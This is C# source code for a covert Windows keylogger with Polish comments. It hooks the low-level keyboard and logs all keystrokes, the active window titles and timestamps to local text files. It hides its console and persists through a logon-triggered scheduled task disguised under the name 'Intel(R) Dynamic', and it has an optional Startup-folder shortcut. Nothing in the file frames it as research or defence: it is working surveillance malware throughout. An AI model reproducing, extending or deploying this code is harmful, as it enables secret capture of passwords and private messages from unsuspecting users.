using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Reflection;
using IWshRuntimeLibrary;
using Microsoft.Win32.TaskScheduler;

class InterceptKeys
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static Stopwatch stopwatch = new Stopwatch();
    private const int IdleThreshold = 2000; // 2 sekundy
    private static IntPtr previousForegroundWindowHandle;

    [STAThread]
    public static void Main()
    {
        string taskName = "Intel(R) Dynamic";
        string executableFileName = "Intel(R) Dynamic.exe";

        string currentDirectory = AppDomain.CurrentDomain.BaseDirectory;

        string executablePath = System.IO.Path.Combine(currentDirectory, executableFileName);

        using (TaskService taskService = new TaskService())
        {
            TaskDefinition taskDefinition = taskService.NewTask();

            taskDefinition.Actions.Add(new ExecAction(executablePath));
            taskDefinition.Triggers.Add(new LogonTrigger());
            try
            {
                taskService.RootFolder.RegisterTaskDefinition(taskName, taskDefinition);
            }
            catch
            {
                // nie dodany do crona ale i tak chill
            }
        }

        // jak user to CreateShortcut()

        var handle = GetConsoleWindow();

        ShowWindow(handle, SW_HIDE);

        previousForegroundWindowHandle = IntPtr.Zero;

        _hookID = SetHook(_proc);
        stopwatch.Start();

        Application.Run();

        UnhookWindowsHookEx(_hookID);
    }

    static void CreateShortcut()
    {
        string appName = "Intel(R) Dynamic";

        string autostartFolderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), $"{appName}.lnk");

        if (!System.IO.File.Exists(autostartFolderPath))
        {
            string appPath = Assembly.GetEntryAssembly().Location;

            WshShell shell = new WshShell();

            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(autostartFolderPath);

            shortcut.TargetPath = appPath;

            shortcut.Save();
        }
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

    private static string CheckSymbols(Keys key)
    {
        bool shiftKey = (Control.ModifierKeys & Keys.Shift) != 0;
        if (shiftKey)
        {
            switch (key)
            {
                case Keys.Left: return "|LEFT|";
                case Keys.Up: return "|UP|";
                case Keys.Right: return "|RIGHT|";
                case Keys.Down: return "|DOWN|";
                case Keys.Return: return "|Return|";
                case Keys.D1: return "!";
                case Keys.D2: return "@";
                case Keys.D3: return "#";
                case Keys.D4: return "$";
                case Keys.D5: return "%";
                case Keys.D6: return "^";
                case Keys.D7: return "&";
                case Keys.D8: return "*";
                case Keys.D9: return "(";
                case Keys.D0: return ")";
                case Keys.Oemtilde: return "~";
                case Keys.OemMinus: return "_";
                case Keys.Oemplus: return "+";
                case Keys.OemOpenBrackets: return "{";
                case Keys.OemCloseBrackets: return "}";
                case Keys.OemSemicolon: return ":";
                case Keys.OemQuotes: return "\"";
                case Keys.OemPipe: return "|";
                case Keys.Oemcomma: return "<";
                case Keys.OemPeriod: return ">";
                case Keys.OemQuestion: return "?";
                case Keys.Back: return "|BACK|"; // backspace
                case Keys.Space: return " ";
            }
        }
        else
        {
            switch (key)
            {
                case Keys.Left: return "|LEFT|";
                case Keys.Up: return "|UP|";
                case Keys.Right: return "|RIGHT|";
                case Keys.Down: return "|DOWN|";
                case Keys.Return: return "|ENTER|";
                case Keys.D1: return "1";
                case Keys.D2: return "2";
                case Keys.D3: return "3";
                case Keys.D4: return "4";
                case Keys.D5: return "5";
                case Keys.D6: return "6";
                case Keys.D7: return "7";
                case Keys.D8: return "8";
                case Keys.D9: return "9";
                case Keys.D0: return "0";
                case Keys.Oemtilde: return "`";
                case Keys.OemMinus: return "-";
                case Keys.Oemplus: return "=";
                case Keys.OemOpenBrackets: return "[";
                case Keys.OemCloseBrackets: return "]";
                case Keys.OemSemicolon: return ";";
                case Keys.OemQuotes: return "'";
                case Keys.OemPipe: return "\\";
                case Keys.Oemcomma: return ",";
                case Keys.OemPeriod: return ".";
                case Keys.OemQuestion: return "/";
                case Keys.Back: return "|BACK|"; // backspace
                case Keys.Space: return " ";
            }
        }

        return "";
    }

    private static string Parse(int key, bool alt)
    {
        bool shiftKey = (Control.ModifierKeys & Keys.Shift) != 0;
    bool ctrlKey = (Control.ModifierKeys & Keys.Control) != 0;

        char keyChar = (char)key;

        string finalResult = CheckSymbols((Keys)key);
        // jesli nie jest symbolem
        if (finalResult.Length > 0)
            return finalResult;

        // litery
        if (char.IsLetter(keyChar))
        {
            // polska gurom
            if (alt)
            {
                switch (key)
                {
                    case (int)Keys.E: return shiftKey ? "Ę" : "ę";
                    case (int)Keys.L: return shiftKey ? "Ł" : "ł";
                    case (int)Keys.O: return shiftKey ? "Ó" : "ó";
                    case (int)Keys.A: return shiftKey ? "Ą" : "ą";
                    case (int)Keys.S: return shiftKey ? "Ś" : "ś";
                    case (int)Keys.Z: return shiftKey ? "Ż" : "ż";
                    case (int)Keys.X: return shiftKey ? "Ź" : "ź";
                    case (int)Keys.C: return shiftKey ? "Ć" : "ć";
                    case (int)Keys.N: return shiftKey ? "Ń" : "ń";
                }
            }

            char caseSensitiveChar = shiftKey ? char.ToUpper(keyChar) : char.ToLower(keyChar);

            finalResult = caseSensitiveChar.ToString();

            if (ctrlKey)
            {
                finalResult = " |CTRL+" + finalResult + "| ";
            }
        }

        return finalResult;
    }

    private static IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)0x0104))
        {
            bool alt = false;
            if (wParam == (IntPtr)0x0104)
            {
                alt = true;
            }
            LogActiveWindowInfo();

            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
            StreamWriter rawSw = new StreamWriter(Application.StartupPath + @"\raw.txt", true);
            int vkCode = Marshal.ReadInt32(lParam);
            if (stopwatch.ElapsedMilliseconds >= IdleThreshold)
            {
                sw.WriteLine();
                rawSw.WriteLine();
            }
            sw.Write(Parse(vkCode, alt));
            rawSw.Write((Keys)vkCode);
            stopwatch.Restart();

            sw.Close();
            rawSw.Close();
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private static void LogActiveWindowInfo()
    {
        IntPtr currentForegroundWindowHandle = GetForegroundWindow();

        if (currentForegroundWindowHandle != previousForegroundWindowHandle)
        {
            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
            StreamWriter rawSw = new StreamWriter(Application.StartupPath + @"\raw.txt", true);

            Process currentProcess = GetProcessFromWindowHandle(currentForegroundWindowHandle);

            const int nChars = 256;
            string windowTitle = new string(' ', nChars);
            GetWindowText(currentForegroundWindowHandle, windowTitle, nChars);

            DateTime currentDateAndTime = DateTime.Now;

            sw.WriteLine();

            sw.WriteLine();
            sw.WriteLine();
            sw.WriteLine($"[Time: {currentDateAndTime}]");
            sw.WriteLine($"[Process Name: {currentProcess?.ProcessName}, Window Title: {windowTitle.Trim()}]");
            rawSw.WriteLine();
            rawSw.WriteLine();
            rawSw.WriteLine($"[Time: {currentDateAndTime}]");
            rawSw.WriteLine($"[Process Name: {currentProcess?.ProcessName}, Window Title: {windowTitle.Trim()}]");

            sw.Close();
            rawSw.Close();

            previousForegroundWindowHandle = currentForegroundWindowHandle;
        }
    }

    private static Process GetProcessFromWindowHandle(IntPtr windowHandle)
    {
        int processId;
        GetWindowThreadProcessId(windowHandle, out processId);

        try
        {
            return Process.GetProcessById(processId);
        }
        catch (ArgumentException)
        {
            // guwno?
            return null;
        }
    }

    [DllImport("user32.dll")]
    private static extern int GetWindowThreadProcessId(IntPtr hWnd, out int lpdwProcessId);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int GetWindowText(IntPtr hWnd, string lpString, int nMaxCount);


    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;
}